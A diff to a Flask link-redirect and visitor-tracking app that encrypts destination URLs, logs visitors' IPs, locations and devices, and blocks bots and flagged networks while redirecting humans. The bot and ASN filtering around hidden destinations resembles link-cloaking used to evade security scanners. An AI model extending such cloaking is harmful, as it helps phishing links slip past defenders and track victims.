+                            {% endif %}
                         </div>
-                        <div id="analytics-tab" class="tab-content hidden">
-                            <div class="bg-white p-8 rounded-xl card">
-                                <h2 class="text-2xl font-bold mb-6 text-gray-900">Traffic Analytics</h2>
-                                <div class="grid grid-cols-2 gap-6">
-                                    <div>
-                                        <h3 class="text-lg font-semibold mb-4">Traffic Sources</h3>
-                                        <canvas id="traffic-source-chart"></canvas>
-                                        <script>
-                                            new Chart(document.getElementById('traffic-source-chart'), {
-                                                type: 'pie',
-                                                data: {
-                                                    labels: {{ traffic_sources_keys|tojson }},
-                                                    datasets: [{
-                                                        data: {{ traffic_sources_values|tojson }},
-                                                        backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
-                                                    }]
-                                                },
-                                                options: {
-                                                    responsive: true,
-                                                    plugins: {
-                                                        legend: { position: 'top' }
-                                                    }
-                                                });
-                                        </script>
-                                    </div>
-                                    <div>
-                                        <h3 class="text-lg font-semibold mb-4">Bot vs Human Ratio</h3>
-                                        <canvas id="bot-ratio-chart"></canvas>
-                                        <script>
-                                            new Chart(document.getElementById('bot-ratio-chart'), {
-                                                type: 'doughnut',
-                                                data: {
-                                                    labels: {{ bot_ratio_keys|tojson }},
-                                                    datasets: [{
-                                                        data: {{ bot_ratio_values|tojson }},
-                                                        backgroundColor: ['#10b981', '#ef4444']
-                                                    }]
-                                                },
-                                                options: {
-                                                    responsive: true,
-                                                    plugins: {
-                                                        legend: { position: 'top' }
-                                                    }
-                                                })
-                                            });
-                                        </script>
-                                    </div>
+                    </div>
+                    <div id="analytics-tab" class="tab-content hidden">
+                        <div class="bg-white p-8 rounded-xl card">
+                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Traffic Analytics</h2>
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <h3 class="text-lg font-semibold mb-4">Traffic Sources</h3>
+                                    <canvas id="traffic-source-chart"></canvas>
+                                    <script>
+                                        new Chart(document.getElementById('traffic-source-chart'), {
+                                            type: 'pie',
+                                            data: {
+                                                labels: {{ traffic_sources_keys|tojson }},
+                                                datasets: [{
+                                                    data: {{ traffic_sources_values|tojson }},
+                                                    backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
+                                                }]
+                                            },
+                                            options: {
+                                                responsive: true,
+                                                plugins: {
+                                                    legend: { position: 'top' }
+                                                }
+                                            }
+                                        });
+                                    </script>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-semibold mb-4">Bot vs Human Ratio</h3>
+                                    <canvas id="bot-ratio-chart"></canvas>
+                                    <script>
+                                        new Chart(document.getElementById('bot-ratio-chart'), {
+                                            type: 'doughnut',
+                                            data: {
+                                                labels: {{ bot_ratio_keys|tojson }},
+                                                datasets: [{
+                                                    data: {{ bot_ratio_values|tojson }},
+                                                    backgroundColor: ['#10b981', '#ef4444']
+                                                }]
+                                            },
+                                            options: {
+                                                responsive: true,
+                                                plugins: {
+                                                    legend: { position: 'top' }
+                                                }
+                                            }
+                                        });
+                                    </script>
                                 </div>
                             </div>
                         </div>
                     </div>
-                </body>
+                </div>
+            </body>
             </html>
         """, username=username, form=form, urls=urls, visitors=visitors, bot_logs=bot_logs,
            traffic_sources_keys=traffic_sources_keys, traffic_sources_values=traffic_sources_values,
@@ -1225,12 +1381,12 @@ def dashboard():
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Error</title>
+                <title>Internal Server Error</title>
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong: {{ error }}</p>
                     <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
@@ -1295,8 +1451,8 @@ def clear_views(url_id):
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                        <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                         <p class="text-gray-600">Database unavailable. Unable to clear views.</p>
                     </div>
                 </body>
@@ -1310,12 +1466,12 @@ def clear_views(url_id):
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Error</title>
+                <title>Internal Server Error</title>
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong. Please try again later.</p>
                 </div>
             </body>
@@ -1332,12 +1488,9 @@ def delete_url(url_id):
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
                 abort(404, "URL not found")
-            student_id = valkey_client.hget(key, "student_id")
             valkey_client.delete(key)
             valkey_client.delete(f"user:{username}:url:{url_id}:visits")
             valkey_client.delete(f"url_payload:{url_id}")
-            if student_id:
-                valkey_client.delete(f"user:{username}:student_id:{student_id}")
             logger.debug(f"Deleted URL {url_id}")
             return redirect(url_for('dashboard'))
         else:
@@ -1352,8 +1505,8 @@ def delete_url(url_id):
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                        <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                         <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                     </div>
                 </body>
@@ -1367,12 +1520,12 @@ def delete_url(url_id):
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Error</title>
+                <title>Internal Server Error</title>
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong. Please try again later.</p>
                 </div>
             </body>
@@ -1395,7 +1548,6 @@ def export_visitors():
                         visitor_data.append(visitor)
                     except Exception as e:
                         logger.error(f"Error processing visitor ID {visitor_id}: {str(e)}")
-                        continue
                 output = StringIO()
                 writer = csv.writer(output)
                 writer.writerow([
@@ -1406,27 +1558,27 @@ def export_visitors():
                 ])
                 for visitor in visitor_data:
                     writer.writerow([
-                        datetime.fromtimestamp(int(visitor.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor.get('timestamp') else '',
-                        visitor.get('ip', ''),
-                        visitor.get('country', ''),
-                        visitor.get('country_code', ''),
-                        visitor.get('region', ''),
-                        visitor.get('region_code', ''),
-                        visitor.get('city', ''),
-                        visitor.get('zip', ''),
+                        datetime.fromtimestamp(int(visitor.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor.get('timestamp') else 'Not Available',
+                        visitor.get('ip', 'Not Available'),
+                        visitor.get('country', 'Not Available'),
+                        visitor.get('country_code', 'N/A'),
+                        visitor.get('region', 'Not Available'),
+                        visitor.get('region_code', 'N/A'),
+                        visitor.get('city', 'Not Available'),
+                        visitor.get('zip', 'N/A'),
                         visitor.get('latitude', '0.0'),
                         visitor.get('longitude', '0.0'),
-                        visitor.get('isp', ''),
-                        visitor.get('organization', ''),
-                        visitor.get('as_number', ''),
-                        visitor.get('timezone', ''),
-                        visitor.get('device_type', ''),
-                        visitor.get('screen_type', ''),
-                        visitor.get('application', ''),
-                        visitor.get('user_agent', ''),
-                        visitor.get('bot_status', ''),
-                        visitor.get('block_reason', ''),
-                        visitor.get('source', ''),
+                        visitor.get('isp', 'Not Available'),
+                        visitor.get('organization', 'Not Available'),
+                        visitor.get('as_number', 'N/A'),
+                        visitor.get('timezone', 'UTC'),
+                        visitor.get('device_type', 'Not Available'),
+                        visitor.get('screen_type', 'Not Available'),
+                        visitor.get('application', 'Not Available'),
+                        visitor.get('user_agent', 'Not Available'),
+                        visitor.get('bot_status', 'Not Available'),
+                        visitor.get('block_reason', 'N/A'),
+                        visitor.get('source', 'direct'),
                         visitor.get('session_duration', '0')
                     ])
                 output.seek(0)
@@ -1437,7 +1589,7 @@ def export_visitors():
                     headers={"Content-Disposition": f"attachment;filename=visitors_{username}.csv"}
                 )
             except Exception as e:
-                logger.error(f"Error in export_visitors: {str(e)}")
+                logger.error(f"Valkey error in export_visitors: {str(e)}")
                 return render_template_string("""
                     <!DOCTYPE html>
                     <html lang="en">
@@ -1447,15 +1599,14 @@ def export_visitors():
                         <title>Error</title>
                         <script src="https://cdn.tailwindcss.com"></script>
                     </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-400 p-4">
-                        <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                            <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                             <p class="text-gray-600">Database unavailable. Unable to export data.</p>
-                            </p>
                         </div>
                     </body>
-                </html>
-            """), 500
+                    </html>
+                """), 500
         else:
             logger.warning("Valkey unavailable for export_visitors")
             return render_template_string("""
@@ -1468,14 +1619,13 @@ def export_visitors():
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                        <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                         <p class="text-gray-600">Database unavailable. Unable to export data.</p>
                     </div>
-                </div>
                 </body>
-            </html>
-        """), 503
+                </html>
+            """), 500
     except Exception as e:
         logger.error(f"Error in export_visitors: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -1484,23 +1634,24 @@ def export_visitors():
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Error</title>
+                <title>Internal Server Error</title>
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-400">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong. Please try again later.</p>
                 </div>
             </body>
-        </html>
-    """), 503
+            </html>
+        """), 500
+
 @app.route("/export/<int:index>", methods=["GET"])
 @login_required
 def export(index):
     try:
         username = session['username']
-        logger.debug(f"Exporting data for user: {username}, index={index}")
+        logger.debug(f"Exporting data for user: {username}, session: {session}")
         if valkey_client:
             try:
                 logger.debug(f"Fetching URL keys for export, user: {username}")
@@ -1517,21 +1668,20 @@ def export(index):
                         visit_data.append(json.loads(v))
                     except json.JSONDecodeError as e:
                         logger.error(f"Error decoding visit data: {str(e)}")
-                        continue
                 output = StringIO()
                 writer = csv.writer(output)
                 writer.writerow(['Timestamp', 'IP', 'Device Type', 'Screen Type', 'App', 'Type', 'Country', 'Region', 'City'])
                 for visit in visit_data:
                     writer.writerow([
-                        datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d %H:%M:%S') if visit.get('timestamp') else '',
-                        visit.get('ip', ''),
-                        visit.get('device_type', ''),
-                        visit.get('screen_type', ''),
-                        visit.get('app', ''),
-                        visit.get('type', ''),
-                        visit.get('location', {}).get('country', ''),
-                        visit.get('location', {}).get('region', ''),
-                        visit.get('location', {}).get('city', '')
+                        datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d %H:%M:%S') if visit.get('timestamp') else 'Not Available',
+                        visit.get('ip', 'Not Available'),
+                        visit.get('device_type', 'Not Available'),
+                        visit.get('screen_type', 'Not Available'),
+                        visit.get('app', 'Not Available'),
+                        visit.get('type', 'Not Available'),
+                        visit.get('location', {}).get('country', 'Not Available'),
+                        visit.get('location', {}).get('region', 'Not Available'),
+                        visit.get('location', {}).get('city', 'Not Available')
                     ])
                 output.seek(0)
                 logger.debug(f"Exported CSV for URL ID: {url_id}")
@@ -1552,8 +1702,8 @@ def export(index):
                         <script src="https://cdn.tailwindcss.com"></script>
                     </head>
                     <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                            <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                             <p class="text-gray-600">Database unavailable. Unable to export data.</p>
                         </div>
                     </body>
@@ -1571,8 +1721,8 @@ def export(index):
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                        <h3 class="text-xl font-bold mb-4 text-red-600">Error</h3>
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                         <p class="text-gray-600">Database unavailable. Unable to export data.</p>
                     </div>
                 </body>
@@ -1590,8 +1740,8 @@ def export(index):
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong. Please try again later.</p>
                 </div>
             </body>
@@ -1614,9 +1764,26 @@ def challenge():
         logger.error(f"Error in challenge: {str(e)}", exc_info=True)
         return {"status": "error"}, 500
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:student_id>", methods=["GET"], subdomain="<username>")
+@app.route("/fingerprint", methods=["POST"])
+def fingerprint():
+    try:
+        data = request.get_json()
+        if data and 'fingerprint' in data:
+            fingerprint = generate_fingerprint()
+            if valkey_client:
+                try:
+                    valkey_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
+                    logger.debug(f"Fingerprint stored: {fingerprint[:10]}...")
+                except Exception as e:
+                    logger.error(f"Valkey error storing fingerprint: {str(e)}")
+        return {"status": "ok"}, 200
+    except Exception as e:
+        logger.error(f"Error in fingerprint: {str(e)}", exc_info=True)
+        return {"status": "error"}, 500
+
+@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
-def redirect_handler(username, endpoint, encrypted_payload, student_id):
+def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
         base_domain = get_base_domain()
         user_agent = request.headers.get("User-Agent", "")
@@ -1625,17 +1792,18 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
         referer = headers.get("Referer", "")
         session_start = session.get('session_start', int(time.time()))
         session['session_start'] = session_start
-        logger.debug(f"Redirect handler: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
-                     f"encrypted_payload={encrypted_payload[:20]}..., student_id={student_id}, "
-                     f"IP={ip}, User-Agent={user_agent[:50]}..., URL={request.url}")
+        logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
+                     f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
+                     f"IP={ip}, User-Agent={user_agent}, URL={request.url}")
 
         is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
+        asn_blocked = check_asn(ip)
         device_info = get_device_info(user_agent)
         device_type = device_info['device_type']
         screen_type = device_info['screen_type']
         app = device_info['application']
         visit_type = "Human"
-        if is_bot_flag:
+        if is_bot_flag or asn_blocked:
             visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
         elif app != "Not Available" and app != device_info['application']:
             visit_type = "App"
@@ -1670,7 +1838,7 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
                         "application": app,
                         "user_agent": user_agent,
                         "bot_status": visit_type,
-                        "block_reason": bot_reason if is_bot_flag else "N/A",
+                        "block_reason": bot_reason if is_bot_flag or asn_blocked else "N/A",
                         "referer": referer,
                         "source": 'referral' if referer else 'direct',
                         "session_duration": session_duration
@@ -1692,7 +1860,7 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
             except Exception as e:
                 logger.error(f"Valkey error logging visit: {str(e)}", exc_info=True)
 
-        if is_bot_flag:
+        if is_bot_flag or asn_blocked:
             logger.warning(f"Blocked redirect for IP {ip}: {bot_reason}")
             abort(403, f"Access denied: {bot_reason}")
 
@@ -1715,62 +1883,78 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
                 logger.error(f"Valkey error checking cached payload: {str(e)}", exc_info=True)
 
         if not payload:
-            try:
-                logger.debug("Attempting slugstorm decryption")
-                data = decrypt_slugstorm(encrypted_payload)
-                payload = data['payload']
-                if valkey_client:
-                    try:
-                        expiry = json.loads(payload).get('expires', int(time.time()) + 86400)
-                        ttl = max(1, int(expiry - time.time()))
-                        valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
-                        logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
-                    except Exception as e:
-                        logger.error(f"Valkey error caching payload: {str(e)}", exc_info=True)
-            except Exception as e:
-                logger.error(f"Decryption failed: {str(e)}", exc_info=True)
-                return render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <title>Invalid Link</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                            <h3 class="text-xl font-bold mb-4 text-red-600">Invalid Link</h3>
-                            <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
-                        </div>
-                    </body>
-                    </html>
-                """), 400
+            methods = ['slugstorm', 'heap_x3', 'signed_token']
+            for method in methods:
+                try:
+                    logger.debug(f"Trying decryption method: {method}")
+                    if method == 'heap_x3':
+                        data = decrypt_heap_x3(encrypted_payload)
+                        payload = data['payload']
+                    elif method == 'slugstorm':
+                        data = decrypt_slugstorm(encrypted_payload)
+                        payload = data['payload']
+                    else:
+                        payload = decrypt_signed_token(encrypted_payload)
+                    logger.debug(f"Decryption successful with {method}")
+                    # Cache the payload in Valkey
+                    if valkey_client:
+                        try:
+                            expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
+                            ttl = max(1, int(expiry - time.time()))
+                            valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
+                            logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
+                        except Exception as e:
+                            logger.error(f"Valkey error caching payload: {str(e)}", exc_info=True)
+                    break
+                except Exception as e:
+                    logger.debug(f"Decryption failed with {method}: {str(e)}")
+                    # Enhanced logging for debugging
+                    if method == 'slugstorm' and 'InvalidSignature' in str(e):
+                        logger.debug(f"Slugstorm signature mismatch: payload={encrypted_payload[:50]}...")
+                    elif method == 'heap_x3' and 'InvalidTag' in str(e):
+                        logger.debug(f"Heap_x3 tag mismatch: payload={encrypted_payload[:50]}...")
+                    elif method == 'signed_token' and 'InvalidSignature' in str(e):
+                        logger.debug(f"Signed_token signature mismatch: payload={encrypted_payload[:50]}...")
+                    continue
+
+        if not payload:
+            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Invalid Link</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                        <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
+                    </div>
+                </body>
+                </html>
+            """), 400
 
         try:
             data = json.loads(payload)
             redirect_url = data.get("student_link")
-            stored_student_id = data.get("student_id")
-            expiry = data.get("expires", float('inf'))
+            expiry = data.get("expiry", float('inf'))
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
                 abort(400, "Invalid redirect URL")
-            if student_id != stored_student_id:
-                logger.warning(f"Student ID mismatch: URL={student_id}, Payload={stored_student_id}")
-                abort(400, "Invalid student ID")
             if time.time() > expiry:
                 logger.warning("URL expired")
                 if valkey_client:
                     valkey_client.delete(f"url_payload:{url_id}")
-                    valkey_client.delete(f"user:{username}:url:{url_id}")
-                    valkey_client.delete(f"user:{username}:student:{student_id}")
                 abort(410, "URL has expired")
-            logger.debug(f"Parsed payload: redirect_url={redirect_url}, student_id={student_id}")
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
-        final_url = redirect_url.rstrip('/')
+        final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
         logger.info(f"Redirecting to {final_url}")
         return redirect(final_url, code=302)
     except Exception as e:
@@ -1785,8 +1969,8 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong: {{ error }}</p>
                     <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
@@ -1794,16 +1978,16 @@ def redirect_handler(username, endpoint, encrypted_payload, student_id):
             </html>
         """, error=str(e)), 500
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:student_id>", methods=["GET"])
+@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
 @rate_limit(limit=5, per=60)
-def redirect_handler_no_subdomain(endpoint, encrypted_payload, student_id):
+def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
     try:
         host = request.host
         username = host.split('.')[0] if '.' in host else "default"
         logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}, "
-                     f"encrypted_payload={encrypted_payload[:20]}..., student_id={student_id}, "
+                     f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
                      f"URL={request.url}")
-        return redirect_handler(username, endpoint, encrypted_payload, student_id)
+        return redirect_handler(username, endpoint, encrypted_payload, path_segment)
     except Exception as e:
         logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -1816,8 +2000,8 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, student_id):
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Internal Server Error</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong: {{ error }}</p>
                     <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
@@ -1839,8 +2023,8 @@ def denied():
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                    <h3 class="text-xl font-bold mb-4 text-red-600">Access Denied</h3>
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
                     <p class="text-gray-600">Suspicious activity detected.</p>
                 </div>
             </body>
@@ -1863,14 +2047,24 @@ def catch_all(path):
             <script src="https://cdn.tailwindcss.com"></script>
         </head>
         <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-            <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
-                <h3 class="text-xl font-bold mb-4 text-red-600">Not Found</h3>
+            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                 <p class="text-gray-600">The requested URL was not found on the server.</p>
                 <p class="text-gray-600">Please check your spelling and try again.</p>
             </div>
         </body>
         </html>
     """), 404
+
+def generate_random_string(length):
+    try:
+        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        result = "".join(secrets.choice(characters) for _ in range(length))
+        logger.debug(f"Generated random string: {result[:10]}...")
+        return result
+    except Exception as e:
+        logger.error(f"Error generating random string: {str(e)}", exc_info=True)
+        return secrets.token_hex(length // 2)
 
 if __name__ == "__main__":
     try:
